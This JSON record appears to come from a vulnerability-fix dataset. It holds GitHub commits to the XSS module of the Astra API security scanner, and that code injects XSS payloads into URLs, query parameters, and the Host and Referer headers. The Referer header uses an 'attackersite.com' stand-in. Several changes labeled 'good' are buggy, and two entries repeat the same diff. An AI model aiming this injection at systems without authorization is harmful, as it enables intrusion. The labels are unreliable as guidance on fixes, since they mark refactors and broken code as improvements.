{
    "https://github.com/flipkart-incubator/Astra": {
        "351a3ccd8dd6944ebeb0faf902c9de5f21be43b6": {
            "url": "https://api.github.com/repos/flipkart-incubator/Astra/commits/351a3ccd8dd6944ebeb0faf902c9de5f21be43b6",
            "html_url": "https://github.com/flipkart-incubator/Astra/commit/351a3ccd8dd6944ebeb0faf902c9de5f21be43b6",
            "sha": "351a3ccd8dd6944ebeb0faf902c9de5f21be43b6",
            "keyword": "XSS change",
            "diff": "diff --git a/modules/xss.py b/modules/xss.py\nindex 5625f59..26c5de5 100644\n--- a/modules/xss.py\n+++ b/modules/xss.py\n@@ -29,7 +29,8 @@ def fetch_xss_payload():\n def check_xss_impact(res_headers):\n     # Return the impact of XSS based on content-type header\n     if res_headers['Content-Type']:\n-        if 'application/json' or 'text/plain'in xss_request['Content-Type']:\n+        if 'application/json' or 'text/plain' in xss_request['Content-Type']:\n+            # Possible XSS \n             impact = \"Low\"\n         else:\n             impact = \"High\"\n@@ -73,19 +74,25 @@ def xss_get_method(url,method,headers,body,scanid=None):\n                         parsed_url = url\n \n                     xss_request_url = req.api_request(parsed_url+'/'+payload,\"GET\",headers)\n+                    if xss_request_url.text.find(payload) != -1:\n+                        impact = check_xss_impact()\n+                        xss_result = True\n+\n                     xss_request_uri = req.api_request(parsed_url+'/?test='+payload,\"GET\",headers)             \n-                    logs.logging.info(\"%s is vulnerable to XSS\",url)\n-                    if xss_request_url.text.find(payload) != -1 or xss_request_uri.text.find(payload) != -1:\n-                        impact = check_xss_impact(xss_request_url.headers)\n+                    if xss_request_url.text.find(payload) != -1:\n+                        impact = check_xss_impact()\n+                        xss_result = True\n+\n+                    if xss_result is True:\n                         print \"%s[{0}] {1} is vulnerable to XSS%s\".format(impact,url)% (api_logger.G, api_logger.W)\n                         attack_result = { \"id\" : 11, \"scanid\" : scanid, \"url\" : url, \"alert\": \"Cross Site Scripting\", \"impact\": impact, \"req_headers\": headers, \"req_body\":body, \"res_headers\": xss_request.headers ,\"res_body\": xss_request.text}\n                         dbupdate.insert_record(attack_result)\n-           \n+               \n             except:\n                 logs.logging.info(\"XSS: No GET param found!\")\n \n def xss_check(url,method,headers,body,scanid):\n     # Main function for XSS attack\n-    xss_payloads = fetch_xss_payload()\n-    xss_get_method(url,method,headers,body,scanid)\n-    xss_http_headers(url,method,headers,body,scanid)\n\\ No newline at end of file\n+    if method == 'GET' or method == 'DEL':\n+        xss_get_method(url,method,headers,body,scanid)\n+        #xss_http_headers(url,method,headers,body,scanid)\n\\ No newline at end of file\n",
            "message": "",
            "files": {
                "/modules/xss.py": {
                    "changes": [
                        {
                            "diff": "\n def check_xss_impact(res_headers):\n     # Return the impact of XSS based on content-type header\n     if res_headers['Content-Type']:\n-        if 'application/json' or 'text/plain'in xss_request['Content-Type']:\n+        if 'application/json' or 'text/plain' in xss_request['Content-Type']:\n+            # Possible XSS \n             impact = \"Low\"\n         else:\n             impact = \"High\"\n",
                            "add": 2,
                            "remove": 1,
                            "filename": "/modules/xss.py",
                            "badparts": [
                                "        if 'application/json' or 'text/plain'in xss_request['Content-Type']:"
                            ],
                            "goodparts": [
                                "        if 'application/json' or 'text/plain' in xss_request['Content-Type']:"
                            ]
                        },
                        {
                            "diff": "\n                         parsed_url = url\n \n                     xss_request_url = req.api_request(parsed_url+'/'+payload,\"GET\",headers)\n+                    if xss_request_url.text.find(payload) != -1:\n+                        impact = check_xss_impact()\n+                        xss_result = True\n+\n                     xss_request_uri = req.api_request(parsed_url+'/?test='+payload,\"GET\",headers)             \n-                    logs.logging.info(\"%s is vulnerable to XSS\",url)\n-                    if xss_request_url.text.find(payload) != -1 or xss_request_uri.text.find(payload) != -1:\n-                        impact = check_xss_impact(xss_request_url.headers)\n+                    if xss_request_url.text.find(payload) != -1:\n+                        impact = check_xss_impact()\n+                        xss_result = True\n+\n+                    if xss_result is True:\n                         print \"%s[{0}] {1} is vulnerable to XSS%s\".format(impact,url)% (api_logger.G, api_logger.W)\n                         attack_result = { \"id\" : 11, \"scanid\" : scanid, \"url\" : url, \"alert\": \"Cross Site Scripting\", \"impact\": impact, \"req_headers\": headers, \"req_body\":body, \"res_headers\": xss_request.headers ,\"res_body\": xss_request.text}\n                         dbupdate.insert_record(attack_result)\n-           \n+               \n             except:\n                 logs.logging.info(\"XSS: No GET param found!\")\n \n def xss_check(url,method,headers,body,scanid):\n     # Main function for XSS attack\n-    xss_payloads = fetch_xss_payload()\n-    xss_get_method(url,method,headers,body,scanid)\n-    xss_http_headers(url,method,headers,body,scanid)\n\\ No newline at end of file\n+    if method == 'GET' or method == 'DEL':\n+        xss_get_method(url,method,headers,body,scanid)\n+        #xss_http_headers(url,method,headers,body,scanid)\n\\ No newline at end of file\n",
                            "add": 13,
                            "remove": 7,
                            "filename": "/modules/xss.py",
                            "badparts": [
                                "                    logs.logging.info(\"%s is vulnerable to XSS\",url)",
                                "                    if xss_request_url.text.find(payload) != -1 or xss_request_uri.text.find(payload) != -1:",
                                "                        impact = check_xss_impact(xss_request_url.headers)",
                                "    xss_payloads = fetch_xss_payload()",
                                "    xss_get_method(url,method,headers,body,scanid)",
                                "    xss_http_headers(url,method,headers,body,scanid)"
                            ],
                            "goodparts": [
                                "                    if xss_request_url.text.find(payload) != -1:",
                                "                        impact = check_xss_impact()",
                                "                        xss_result = True",
                                "                    if xss_request_url.text.find(payload) != -1:",
                                "                        impact = check_xss_impact()",
                                "                        xss_result = True",
                                "                    if xss_result is True:",
                                "    if method == 'GET' or method == 'DEL':",
                                "        xss_get_method(url,method,headers,body,scanid)"
                            ]
                        }
                    ],
                    "source": "\nimport os import urlparse import sendrequest as req import utils.logs as logs import urlparse from utils.logger import logger from utils.db import Database_update from utils.config import get_value dbupdate=Database_update() api_logger=logger() def fetch_xss_payload(): payload_list=[] if os.getcwd().split('/')[-1]=='API': path='../Payloads/xss.txt' else: path='Payloads/xss.txt' with open(path) as f: for line in f: if line: payload_list.append(line.rstrip()) return payload_list def check_xss_impact(res_headers): if res_headers['Content-Type']: if 'application/json' or 'text/plain'in xss_request['Content-Type']: impact=\"Low\" else: impact=\"High\" else: impact=\"Low\" return impact def xss_get_method(url,method,headers,body,scanid=None): result='' url_query=urlparse.urlparse(url) parsed_query=urlparse.parse_qs(url_query.query) if parsed_query: for key,value in parsed_query.items(): try: logs.logging.info(\"GET param for xss: %s\",key) xss_payloads=fetch_xss_payload() for payload in xss_payloads: if result is not True: xss_url=url.replace(value[0], payload) xss_request=req.api_request(xss_url,\"GET\",headers) if xss_request.text.find(payload) !=-1: impact=check_xss_impact(xss_request.headers) logs.logging.info(\"%s is vulnerable to XSS\",url) print \"%s[{0}]{1} is vulnerable to XSS%s\".format(impact,url)%(api_logger.G, api_logger.W) attack_result={ \"id\": 11, \"scanid\": scanid, \"url\": url, \"alert\": \"Cross Site Scripting\", \"impact\": impact, \"req_headers\": headers, \"req_body\":body, \"res_headers\": xss_request.headers,\"res_body\": xss_request.text} dbupdate.insert_record(attack_result) result=True uri_check_list=['?', '&', '=', '%3F', '%26', '%3D'] for uri_list in uri_check_list: if uri_list in url: parsed_url=urlparse.urlparse(url).scheme+\"://\"+urlparse.urlparse(url).netloc+urlparse.urlparse(url).path break if parsed_url=='': parsed_url=url xss_request_url=req.api_request(parsed_url+'/'+payload,\"GET\",headers) xss_request_uri=req.api_request(parsed_url+'/?test='+payload,\"GET\",headers) logs.logging.info(\"%s is vulnerable to XSS\",url) if xss_request_url.text.find(payload) !=-1 or xss_request_uri.text.find(payload) !=-1: impact=check_xss_impact(xss_request_url.headers) print \"%s[{0}]{1} is vulnerable to XSS%s\".format(impact,url)%(api_logger.G, api_logger.W) attack_result={ \"id\": 11, \"scanid\": scanid, \"url\": url, \"alert\": \"Cross Site Scripting\", \"impact\": impact, \"req_headers\": headers, \"req_body\":body, \"res_headers\": xss_request.headers,\"res_body\": xss_request.text} dbupdate.insert_record(attack_result) except: logs.logging.info(\"XSS: No GET param found!\") def xss_check(url,method,headers,body,scanid): xss_payloads=fetch_xss_payload() xss_get_method(url,method,headers,body,scanid) xss_http_headers(url,method,headers,body,scanid) ",
                    "sourceWithComments": "import os\nimport urlparse\nimport sendrequest as req\nimport utils.logs as logs\nimport urlparse\n\nfrom utils.logger import logger\nfrom utils.db import Database_update\nfrom utils.config import get_value\n\ndbupdate = Database_update()\napi_logger = logger()\n\ndef fetch_xss_payload():\n    # Returns xss payloads in list type\n    payload_list = []\n    if os.getcwd().split('/')[-1] == 'API':\n        path = '../Payloads/xss.txt'\n    else:\n        path = 'Payloads/xss.txt'\n\n    with open(path) as f:\n        for line in f:\n            if line:\n                payload_list.append(line.rstrip())\n\n    return payload_list\n\ndef check_xss_impact(res_headers):\n    # Return the impact of XSS based on content-type header\n    if res_headers['Content-Type']:\n        if 'application/json' or 'text/plain'in xss_request['Content-Type']:\n            impact = \"Low\"\n        else:\n            impact = \"High\"\n    else:\n        impact = \"Low\"\n\n    return impact\n\ndef xss_get_method(url,method,headers,body,scanid=None):\n    # Test for XSS in GET param\n    result = ''\n    url_query = urlparse.urlparse(url)\n    parsed_query = urlparse.parse_qs(url_query.query)\n    if parsed_query:\n        for key,value in parsed_query.items():\n            try:\n                logs.logging.info(\"GET param for xss : %s\",key)\n                xss_payloads = fetch_xss_payload()\n                for payload in xss_payloads:\n                    # check for URI based XSS\n                    # Example : http://localhost/?firstname=<payload>&lastname=<payload>\n                    if result is not True:\n                        xss_url = url.replace(value[0], payload)\n                        xss_request = req.api_request(xss_url,\"GET\",headers)\n                        if xss_request.text.find(payload) != -1:\n                            impact = check_xss_impact(xss_request.headers)\n                            logs.logging.info(\"%s is vulnerable to XSS\",url)\n                            print \"%s[{0}] {1} is vulnerable to XSS%s\".format(impact,url)% (api_logger.G, api_logger.W)\n                            attack_result = { \"id\" : 11, \"scanid\" : scanid, \"url\" : url, \"alert\": \"Cross Site Scripting\", \"impact\": impact, \"req_headers\": headers, \"req_body\":body, \"res_headers\": xss_request.headers ,\"res_body\": xss_request.text}\n                            dbupdate.insert_record(attack_result)\n                            result = True\n\n                    # Check for URL based XSS. Ex: http://localhost/<payload>, http://localhost//?randomparam=<payload>\n                    uri_check_list = ['?', '&', '=', '%3F', '%26', '%3D']\n                    for uri_list in uri_check_list:\n                        if uri_list in url:\n                            # Parse domain name from URI.\n                            parsed_url = urlparse.urlparse(url).scheme+\"://\"+urlparse.urlparse(url).netloc+urlparse.urlparse(url).path\n                            break\n                    if parsed_url == '':\n                        parsed_url = url\n\n                    xss_request_url = req.api_request(parsed_url+'/'+payload,\"GET\",headers)\n                    xss_request_uri = req.api_request(parsed_url+'/?test='+payload,\"GET\",headers)             \n                    logs.logging.info(\"%s is vulnerable to XSS\",url)\n                    if xss_request_url.text.find(payload) != -1 or xss_request_uri.text.find(payload) != -1:\n                        impact = check_xss_impact(xss_request_url.headers)\n                        print \"%s[{0}] {1} is vulnerable to XSS%s\".format(impact,url)% (api_logger.G, api_logger.W)\n                        attack_result = { \"id\" : 11, \"scanid\" : scanid, \"url\" : url, \"alert\": \"Cross Site Scripting\", \"impact\": impact, \"req_headers\": headers, \"req_body\":body, \"res_headers\": xss_request.headers ,\"res_body\": xss_request.text}\n                        dbupdate.insert_record(attack_result)\n           \n            except:\n                logs.logging.info(\"XSS: No GET param found!\")\n\ndef xss_check(url,method,headers,body,scanid):\n    # Main function for XSS attack\n    xss_payloads = fetch_xss_payload()\n    xss_get_method(url,method,headers,body,scanid)\n    xss_http_headers(url,method,headers,body,scanid)"
                }
            },
            "msg": "changes in xss_get_method function"
        },
        "c7435cdd6357bed9fa1859782a70ad6a7a71125d": {
            "url": "https://api.github.com/repos/flipkart-incubator/Astra/commits/c7435cdd6357bed9fa1859782a70ad6a7a71125d",
            "html_url": "https://github.com/flipkart-incubator/Astra/commit/c7435cdd6357bed9fa1859782a70ad6a7a71125d",
            "sha": "c7435cdd6357bed9fa1859782a70ad6a7a71125d",
            "keyword": "XSS change",
            "diff": "diff --git a/modules/xss.py b/modules/xss.py\nindex 5625f59..26c5de5 100644\n--- a/modules/xss.py\n+++ b/modules/xss.py\n@@ -29,7 +29,8 @@ def fetch_xss_payload():\n def check_xss_impact(res_headers):\n     # Return the impact of XSS based on content-type header\n     if res_headers['Content-Type']:\n-        if 'application/json' or 'text/plain'in xss_request['Content-Type']:\n+        if 'application/json' or 'text/plain' in xss_request['Content-Type']:\n+            # Possible XSS \n             impact = \"Low\"\n         else:\n             impact = \"High\"\n@@ -73,19 +74,25 @@ def xss_get_method(url,method,headers,body,scanid=None):\n                         parsed_url = url\n \n                     xss_request_url = req.api_request(parsed_url+'/'+payload,\"GET\",headers)\n+                    if xss_request_url.text.find(payload) != -1:\n+                        impact = check_xss_impact()\n+                        xss_result = True\n+\n                     xss_request_uri = req.api_request(parsed_url+'/?test='+payload,\"GET\",headers)             \n-                    logs.logging.info(\"%s is vulnerable to XSS\",url)\n-                    if xss_request_url.text.find(payload) != -1 or xss_request_uri.text.find(payload) != -1:\n-                        impact = check_xss_impact(xss_request_url.headers)\n+                    if xss_request_url.text.find(payload) != -1:\n+                        impact = check_xss_impact()\n+                        xss_result = True\n+\n+                    if xss_result is True:\n                         print \"%s[{0}] {1} is vulnerable to XSS%s\".format(impact,url)% (api_logger.G, api_logger.W)\n                         attack_result = { \"id\" : 11, \"scanid\" : scanid, \"url\" : url, \"alert\": \"Cross Site Scripting\", \"impact\": impact, \"req_headers\": headers, \"req_body\":body, \"res_headers\": xss_request.headers ,\"res_body\": xss_request.text}\n                         dbupdate.insert_record(attack_result)\n-           \n+               \n             except:\n                 logs.logging.info(\"XSS: No GET param found!\")\n \n def xss_check(url,method,headers,body,scanid):\n     # Main function for XSS attack\n-    xss_payloads = fetch_xss_payload()\n-    xss_get_method(url,method,headers,body,scanid)\n-    xss_http_headers(url,method,headers,body,scanid)\n\\ No newline at end of file\n+    if method == 'GET' or method == 'DEL':\n+        xss_get_method(url,method,headers,body,scanid)\n+        #xss_http_headers(url,method,headers,body,scanid)\n\\ No newline at end of file\n",
            "message": "",
            "files": {
                "/modules/xss.py": {
                    "changes": [
                        {
                            "diff": "\n def check_xss_impact(res_headers):\n     # Return the impact of XSS based on content-type header\n     if res_headers['Content-Type']:\n-        if 'application/json' or 'text/plain'in xss_request['Content-Type']:\n+        if 'application/json' or 'text/plain' in xss_request['Content-Type']:\n+            # Possible XSS \n             impact = \"Low\"\n         else:\n             impact = \"High\"\n",
                            "add": 2,
                            "remove": 1,
                            "filename": "/modules/xss.py",
                            "badparts": [
                                "        if 'application/json' or 'text/plain'in xss_request['Content-Type']:"
                            ],
                            "goodparts": [
                                "        if 'application/json' or 'text/plain' in xss_request['Content-Type']:"
                            ]
                        },
                        {
                            "diff": "\n                         parsed_url = url\n \n                     xss_request_url = req.api_request(parsed_url+'/'+payload,\"GET\",headers)\n+                    if xss_request_url.text.find(payload) != -1:\n+                        impact = check_xss_impact()\n+                        xss_result = True\n+\n                     xss_request_uri = req.api_request(parsed_url+'/?test='+payload,\"GET\",headers)             \n-                    logs.logging.info(\"%s is vulnerable to XSS\",url)\n-                    if xss_request_url.text.find(payload) != -1 or xss_request_uri.text.find(payload) != -1:\n-                        impact = check_xss_impact(xss_request_url.headers)\n+                    if xss_request_url.text.find(payload) != -1:\n+                        impact = check_xss_impact()\n+                        xss_result = True\n+\n+                    if xss_result is True:\n                         print \"%s[{0}] {1} is vulnerable to XSS%s\".format(impact,url)% (api_logger.G, api_logger.W)\n                         attack_result = { \"id\" : 11, \"scanid\" : scanid, \"url\" : url, \"alert\": \"Cross Site Scripting\", \"impact\": impact, \"req_headers\": headers, \"req_body\":body, \"res_headers\": xss_request.headers ,\"res_body\": xss_request.text}\n                         dbupdate.insert_record(attack_result)\n-           \n+               \n             except:\n                 logs.logging.info(\"XSS: No GET param found!\")\n \n def xss_check(url,method,headers,body,scanid):\n     # Main function for XSS attack\n-    xss_payloads = fetch_xss_payload()\n-    xss_get_method(url,method,headers,body,scanid)\n-    xss_http_headers(url,method,headers,body,scanid)\n\\ No newline at end of file\n+    if method == 'GET' or method == 'DEL':\n+        xss_get_method(url,method,headers,body,scanid)\n+        #xss_http_headers(url,method,headers,body,scanid)\n\\ No newline at end of file\n",
                            "add": 13,
                            "remove": 7,
                            "filename": "/modules/xss.py",
                            "badparts": [
                                "                    logs.logging.info(\"%s is vulnerable to XSS\",url)",
                                "                    if xss_request_url.text.find(payload) != -1 or xss_request_uri.text.find(payload) != -1:",
                                "                        impact = check_xss_impact(xss_request_url.headers)",
                                "    xss_payloads = fetch_xss_payload()",
                                "    xss_get_method(url,method,headers,body,scanid)",
                                "    xss_http_headers(url,method,headers,body,scanid)"
                            ],
                            "goodparts": [
                                "                    if xss_request_url.text.find(payload) != -1:",
                                "                        impact = check_xss_impact()",
                                "                        xss_result = True",
                                "                    if xss_request_url.text.find(payload) != -1:",
                                "                        impact = check_xss_impact()",
                                "                        xss_result = True",
                                "                    if xss_result is True:",
                                "    if method == 'GET' or method == 'DEL':",
                                "        xss_get_method(url,method,headers,body,scanid)"
                            ]
                        }
                    ],
                    "source": "\nimport os import urlparse import sendrequest as req import utils.logs as logs import urlparse from utils.logger import logger from utils.db import Database_update from utils.config import get_value dbupdate=Database_update() api_logger=logger() def fetch_xss_payload(): payload_list=[] if os.getcwd().split('/')[-1]=='API': path='../Payloads/xss.txt' else: path='Payloads/xss.txt' with open(path) as f: for line in f: if line: payload_list.append(line.rstrip()) return payload_list def check_xss_impact(res_headers): if res_headers['Content-Type']: if 'application/json' or 'text/plain'in xss_request['Content-Type']: impact=\"Low\" else: impact=\"High\" else: impact=\"Low\" return impact def xss_get_method(url,method,headers,body,scanid=None): result='' url_query=urlparse.urlparse(url) parsed_query=urlparse.parse_qs(url_query.query) if parsed_query: for key,value in parsed_query.items(): try: logs.logging.info(\"GET param for xss: %s\",key) xss_payloads=fetch_xss_payload() for payload in xss_payloads: if result is not True: xss_url=url.replace(value[0], payload) xss_request=req.api_request(xss_url,\"GET\",headers) if xss_request.text.find(payload) !=-1: impact=check_xss_impact(xss_request.headers) logs.logging.info(\"%s is vulnerable to XSS\",url) print \"%s[{0}]{1} is vulnerable to XSS%s\".format(impact,url)%(api_logger.G, api_logger.W) attack_result={ \"id\": 11, \"scanid\": scanid, \"url\": url, \"alert\": \"Cross Site Scripting\", \"impact\": impact, \"req_headers\": headers, \"req_body\":body, \"res_headers\": xss_request.headers,\"res_body\": xss_request.text} dbupdate.insert_record(attack_result) result=True uri_check_list=['?', '&', '=', '%3F', '%26', '%3D'] for uri_list in uri_check_list: if uri_list in url: parsed_url=urlparse.urlparse(url).scheme+\"://\"+urlparse.urlparse(url).netloc+urlparse.urlparse(url).path break if parsed_url=='': parsed_url=url xss_request_url=req.api_request(parsed_url+'/'+payload,\"GET\",headers) xss_request_uri=req.api_request(parsed_url+'/?test='+payload,\"GET\",headers) logs.logging.info(\"%s is vulnerable to XSS\",url) if xss_request_url.text.find(payload) !=-1 or xss_request_uri.text.find(payload) !=-1: impact=check_xss_impact(xss_request_url.headers) print \"%s[{0}]{1} is vulnerable to XSS%s\".format(impact,url)%(api_logger.G, api_logger.W) attack_result={ \"id\": 11, \"scanid\": scanid, \"url\": url, \"alert\": \"Cross Site Scripting\", \"impact\": impact, \"req_headers\": headers, \"req_body\":body, \"res_headers\": xss_request.headers,\"res_body\": xss_request.text} dbupdate.insert_record(attack_result) except: logs.logging.info(\"XSS: No GET param found!\") def xss_check(url,method,headers,body,scanid): xss_payloads=fetch_xss_payload() xss_get_method(url,method,headers,body,scanid) xss_http_headers(url,method,headers,body,scanid) ",
                    "sourceWithComments": "import os\nimport urlparse\nimport sendrequest as req\nimport utils.logs as logs\nimport urlparse\n\nfrom utils.logger import logger\nfrom utils.db import Database_update\nfrom utils.config import get_value\n\ndbupdate = Database_update()\napi_logger = logger()\n\ndef fetch_xss_payload():\n    # Returns xss payloads in list type\n    payload_list = []\n    if os.getcwd().split('/')[-1] == 'API':\n        path = '../Payloads/xss.txt'\n    else:\n        path = 'Payloads/xss.txt'\n\n    with open(path) as f:\n        for line in f:\n            if line:\n                payload_list.append(line.rstrip())\n\n    return payload_list\n\ndef check_xss_impact(res_headers):\n    # Return the impact of XSS based on content-type header\n    if res_headers['Content-Type']:\n        if 'application/json' or 'text/plain'in xss_request['Content-Type']:\n            impact = \"Low\"\n        else:\n            impact = \"High\"\n    else:\n        impact = \"Low\"\n\n    return impact\n\ndef xss_get_method(url,method,headers,body,scanid=None):\n    # Test for XSS in GET param\n    result = ''\n    url_query = urlparse.urlparse(url)\n    parsed_query = urlparse.parse_qs(url_query.query)\n    if parsed_query:\n        for key,value in parsed_query.items():\n            try:\n                logs.logging.info(\"GET param for xss : %s\",key)\n                xss_payloads = fetch_xss_payload()\n                for payload in xss_payloads:\n                    # check for URI based XSS\n                    # Example : http://localhost/?firstname=<payload>&lastname=<payload>\n                    if result is not True:\n                        xss_url = url.replace(value[0], payload)\n                        xss_request = req.api_request(xss_url,\"GET\",headers)\n                        if xss_request.text.find(payload) != -1:\n                            impact = check_xss_impact(xss_request.headers)\n                            logs.logging.info(\"%s is vulnerable to XSS\",url)\n                            print \"%s[{0}] {1} is vulnerable to XSS%s\".format(impact,url)% (api_logger.G, api_logger.W)\n                            attack_result = { \"id\" : 11, \"scanid\" : scanid, \"url\" : url, \"alert\": \"Cross Site Scripting\", \"impact\": impact, \"req_headers\": headers, \"req_body\":body, \"res_headers\": xss_request.headers ,\"res_body\": xss_request.text}\n                            dbupdate.insert_record(attack_result)\n                            result = True\n\n                    # Check for URL based XSS. Ex: http://localhost/<payload>, http://localhost//?randomparam=<payload>\n                    uri_check_list = ['?', '&', '=', '%3F', '%26', '%3D']\n                    for uri_list in uri_check_list:\n                        if uri_list in url:\n                            # Parse domain name from URI.\n                            parsed_url = urlparse.urlparse(url).scheme+\"://\"+urlparse.urlparse(url).netloc+urlparse.urlparse(url).path\n                            break\n                    if parsed_url == '':\n                        parsed_url = url\n\n                    xss_request_url = req.api_request(parsed_url+'/'+payload,\"GET\",headers)\n                    xss_request_uri = req.api_request(parsed_url+'/?test='+payload,\"GET\",headers)             \n                    logs.logging.info(\"%s is vulnerable to XSS\",url)\n                    if xss_request_url.text.find(payload) != -1 or xss_request_uri.text.find(payload) != -1:\n                        impact = check_xss_impact(xss_request_url.headers)\n                        print \"%s[{0}] {1} is vulnerable to XSS%s\".format(impact,url)% (api_logger.G, api_logger.W)\n                        attack_result = { \"id\" : 11, \"scanid\" : scanid, \"url\" : url, \"alert\": \"Cross Site Scripting\", \"impact\": impact, \"req_headers\": headers, \"req_body\":body, \"res_headers\": xss_request.headers ,\"res_body\": xss_request.text}\n                        dbupdate.insert_record(attack_result)\n           \n            except:\n                logs.logging.info(\"XSS: No GET param found!\")\n\ndef xss_check(url,method,headers,body,scanid):\n    # Main function for XSS attack\n    xss_payloads = fetch_xss_payload()\n    xss_get_method(url,method,headers,body,scanid)\n    xss_http_headers(url,method,headers,body,scanid)"
                }
            },
            "msg": "changes in xss_get_method function"
        },
        "0ba0637b662761acf042636097913f8fb84df4c7": {
            "url": "https://api.github.com/repos/flipkart-incubator/Astra/commits/0ba0637b662761acf042636097913f8fb84df4c7",
            "html_url": "https://github.com/flipkart-incubator/Astra/commit/0ba0637b662761acf042636097913f8fb84df4c7",
            "sha": "0ba0637b662761acf042636097913f8fb84df4c7",
            "keyword": "XSS change",
            "diff": "diff --git a/modules/xss.py b/modules/xss.py\nindex 36137f2..93dafcb 100644\n--- a/modules/xss.py\n+++ b/modules/xss.py\n@@ -3,6 +3,7 @@\n import sendrequest as req\n import utils.logs as logs\n import urlparse\n+import time\n \n from utils.logger import logger\n from utils.db import Database_update\n@@ -29,7 +30,7 @@ def fetch_xss_payload():\n def check_xss_impact(res_headers):\n     # Return the impact of XSS based on content-type header\n     if res_headers['Content-Type']:\n-        if 'application/json' or 'text/plain' in xss_request['Content-Type']:\n+        if 'application/json' or 'text/plain' in res_headers['Content-Type']:\n             # Possible XSS \n             impact = \"Low\"\n         else:\n@@ -40,9 +41,43 @@ def check_xss_impact(res_headers):\n     return impact\n \n \n+def xss_http_headers(url,method,headers,body,scanid=None):\n+    # This function checks different header based XSS.\n+    # XSS via Host header (Limited to IE)\n+    # Reference : http://sagarpopat.in/2017/03/06/yahooxss/\n+    temp_headers = {}\n+    temp_headers.update(headers)\n+    xss_payloads = fetch_xss_payload()\n+    for payload in xss_payloads:\n+        parse_domain = urlparse.urlparse(url).netloc\n+        host_header = {\"Host\" : parse_domain + '/' + payload}\n+        headers.update(host_header)\n+        host_header_xss = req.api_request(url, \"GET\", headers)\n+        if host_header_xss.text.find(payload) != -1:\n+            impact = \"Low\"\n+            attack_result = { \"id\" : 11, \"scanid\" : scanid, \"url\" : url, \"alert\": \"Cross Site Scripting\", \"impact\": impact, \"req_headers\": headers, \"req_body\":body, \"res_headers\": host_header_xss.headers ,\"res_body\": xss_request.text}\n+            print \"%s[{0}] {1} is vulnerable to XSS%s\".format(impact,url)% (api_logger.G, api_logger.W)\n+            dbupdate.insert_record(xss_http_headers)\n+            break\n+\n+    # Test for Referer based XSS \n+    for payload in xss_payloads:\n+        referer_header_value = 'http://attackersite.com?test='+payload\n+        referer_header = {\"Referer\" : referer_header_value}\n+        temp_headers.update(referer_header)\n+        ref_header_xss = req.api_request(url, \"GET\", temp_headers)\n+        if ref_header_xss.text.find(payload) != -1:\n+            impact = check_xss_impact(temp_headers)\n+            print \"%s[{0}] {1} is vulnerable to XSS via referer header%s\".format(impact,url)% (api_logger.G, api_logger.W)\n+            attack_result = { \"id\" : 11, \"scanid\" : scanid, \"url\" : url, \"alert\": \"Cross Site Scripting via referer header\", \"impact\": impact, \"req_headers\": temp_headers, \"req_body\":body, \"res_headers\": ref_header_xss.headers ,\"res_body\": ref_header_xss.text}\n+            dbupdate.insert_record(attack_result)\n+            break\n+\n+\n def xss_get_url(url,method,headers,body,scanid=None):\n-    # Check for URL based XSS. Ex: http://localhost/<payload>, http://localhost//?randomparam=<payload>\n-    xss_result = ''\n+    # Check for URL based XSS. \n+    # Ex: http://localhost/<payload>, http://localhost//?randomparam=<payload>\n+    result = ''\n     xss_payloads = fetch_xss_payload()\n     uri_check_list = ['?', '&', '=', '%3F', '%26', '%3D']\n     for uri_list in uri_check_list:\n@@ -56,23 +91,24 @@ def xss_get_url(url,method,headers,body,scanid=None):\n \n     for payload in xss_payloads:\n             xss_request_url = req.api_request(parsed_url+'/'+payload,\"GET\",headers)\n-            if xss_request_url.text.find(payload) != -1:\n-                impact = check_xss_impact(xss_request_url.headers)\n-                xss_result = True\n+            if result is not True:\n+                if xss_request_url.text.find(payload) != -1:\n+                    impact = check_xss_impact(xss_request_url.headers)\n+                    attack_result = { \"id\" : 11, \"scanid\" : scanid, \"url\" : url, \"alert\": \"Cross Site Scripting\", \"impact\": impact, \"req_headers\": headers, \"req_body\":body, \"res_headers\": xss_request_url.headers ,\"res_body\": xss_request_url.text}\n+                    dbupdate.insert_record(attack_result)\n+                    result = True\n \n             xss_request_uri = req.api_request(parsed_url+'/?test='+payload,\"GET\",headers)             \n             if xss_request_url.text.find(payload) != -1:\n                 impact = check_xss_impact()\n-                xss_result = True\n-\n-            if xss_result is True:\n                 print \"%s[{0}] {1} is vulnerable to XSS%s\".format(impact,url)% (api_logger.G, api_logger.W)\n-                attack_result = { \"id\" : 11, \"scanid\" : scanid, \"url\" : url, \"alert\": \"Cross Site Scripting\", \"impact\": impact, \"req_headers\": headers, \"req_body\":body, \"res_headers\": xss_request.headers ,\"res_body\": xss_request.text}\n+                attack_result = { \"id\" : 11, \"scanid\" : scanid, \"url\" : url, \"alert\": \"Cross Site Scripting\", \"impact\": impact, \"req_headers\": headers, \"req_body\":body, \"res_headers\": xss_request_url.headers ,\"res_body\": xss_request_url.text}\n                 dbupdate.insert_record(attack_result)\n-                return\n+                \n \n def xss_get_uri(url,method,headers,body,scanid=None):\n-    # Test for XSS in GET param\n+    # This function checks for URI based XSS. \n+    # http://localhost/?firstname=<payload>&lastname=<payload>\n     db_update = ''\n     vul_param = ''\n     url_query = urlparse.urlparse(url)\n@@ -87,11 +123,9 @@ def xss_get_uri(url,method,headers,body,scanid=None):\n                     # check for URI based XSS\n                     # Example : http://localhost/?firstname=<payload>&lastname=<payload>\n                     if result is not True:\n-                        print \"param to test\",key\n                         parsed_url = urlparse.urlparse(url)\n                         xss_url = parsed_url.scheme+\"://\"+parsed_url.netloc+parsed_url.path+\"/?\"+parsed_url.query.replace(value[0], payload)\n                         xss_request = req.api_request(xss_url,\"GET\",headers)\n-                        print xss_request.text\n                         if xss_request.text.find(payload) != -1:\n                             impact = check_xss_impact(xss_request.headers)\n                             logs.logging.info(\"%s is vulnerable to XSS\",url)\n@@ -111,7 +145,9 @@ def xss_get_uri(url,method,headers,body,scanid=None):\n             except:\n                 logs.logging.info(\"XSS: No GET param found!\")\n \n-        print \"all params\",vul_param\n+        if vul_param:\n+            # Update all vulnerable params to db.\n+            dbupdate.update_record({\"scanid\": scanid}, {\"$set\" : {\"scan_data\" : vul_param+\" are vulnerable to XSS\"}})\n \n \n def xss_check(url,method,headers,body,scanid):\n@@ -119,4 +155,5 @@ def xss_check(url,method,headers,body,scanid):\n     if method == 'GET' or method == 'DEL':\n         xss_get_uri(url,method,headers,body,scanid)\n         xss_get_url(url,method,headers,body,scanid)\n-        #xss_http_headers(url,method,headers,body,scanid)\n\\ No newline at end of file\n+    \n+    xss_http_headers(url,method,headers,body,scanid)\n\\ No newline at end of file\n",
            "message": "",
            "files": {
                "/modules/xss.py": {
                    "changes": [
                        {
